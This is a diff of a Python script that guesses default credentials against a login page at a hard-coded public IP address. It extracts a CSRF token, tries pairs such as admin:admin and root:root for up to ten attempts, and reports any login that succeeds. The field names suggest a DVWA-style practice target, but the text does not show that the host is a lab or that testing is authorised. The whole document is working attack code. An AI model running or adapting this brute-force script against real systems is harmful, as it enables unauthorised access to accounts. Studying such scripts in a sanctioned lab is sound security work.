@@ -1,67 +1,66 @@
 
 import requests
 import re
+from urllib.parse import urljoin
 
-# URL
-base_url = "http://31.97.117.123"
-login_url = f"{base_url}/login.php"
+target = "http://31.97.117.123"
+session = requests.Session()
 
 # Common credentials to try
 credentials = [
     ("admin", "admin"),
     ("admin", "password"),
-    ("user", "user"),
-    ("admin", "12345"),
+    ("admin", "123456"),
     ("user", "password"),
     ("test", "test"),
     ("admin", "admin123"),
     ("root", "root"),
-    ("administrator", "admin"),
+    ("admin", ""),
+    ("", "admin"),
     ("guest", "guest"),
 ]
-
-session = requests.Session()
-
-# First, get the login page to extract the user_token
-response = session.get(login_url)
-token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)
-
-if token_match:
-    user_token = token_match.group(1)
-    print(f"[*] Found user_token: {user_token}")
-else:
-    print("[!] Could not find user_token")
-    exit(1)
 
 attempt = 0
 for username, password in credentials:
     attempt += 1
-    print(f"\n[Attempt {attempt}] Trying {username}:{password}")
+    if attempt > 10:
+        print(f"[!] Reached 10 unsuccessful attempts, stopping")
+        break
     
-    # Prepare login data
-    data = {
+    # Get login page to extract token
+    response = session.get(f"{target}/login.php")
+    token_match = re.search(r"user_token.*?value='([^']+)'", response.text)
+    
+    if not token_match:
+        print(f"[!] Could not extract token")
+        continue
+    
+    token = token_match.group(1)
+    
+    # Attempt login
+    login_data = {
         "username": username,
         "password": password,
-        "user_token": user_token,
+        "user_token": token,
         "Login": "Login"
     }
     
-    # Attempt login
-    response = session.post(login_url, data=data, allow_redirects=True)
+    response = session.post(f"{target}/login.php", data=login_data)
     
-    # Check if login was successful
-    if "Welcome" in response.text or "Logout" in response.text or "index.php" in response.url:
-        print(f"[+] SUCCESS! Credentials found: {username}:{password}")
-        print(f"[+] Redirected to: {response.url}")
-        break
-    elif "Login failed" in response.text or "incorrect" in response.text.lower():
-        print(f"[-] Failed login")
+    if "Location" in response.history[0].headers:
+        redirect = response.history[0].headers.get("Location", "")
+        if "index.php" in redirect or response.status_code == 200:
+            print(f"[+] SUCCESS! Credentials found: {username}:{password}")
+            # Check if we're logged in
+            response = session.get(f"{target}/index.php")
+            if "logout" in response.text.lower() or "welcome" in response.text.lower():
+                print(f"[+] Confirmed logged in as {username}")
+                break
+    
+    if "login" not in response.url.lower() or "incorrect" in response.text.lower() or "failed" in response.text.lower():
+        print(f"[-] Attempt {attempt}: {username}:{password} - Failed")
     else:
-        print(f"[?] Unknown response")
-    
-    if attempt >= 10:
-        print("\n[!] Reached 10 attempts limit")
-        break
+        print(f"[-] Attempt {attempt}: {username}:{password} - No clear response")
 
-print("\n[*] Session cookies:", session.cookies.get_dict())
+print("\n[*] Login attempts completed")
 
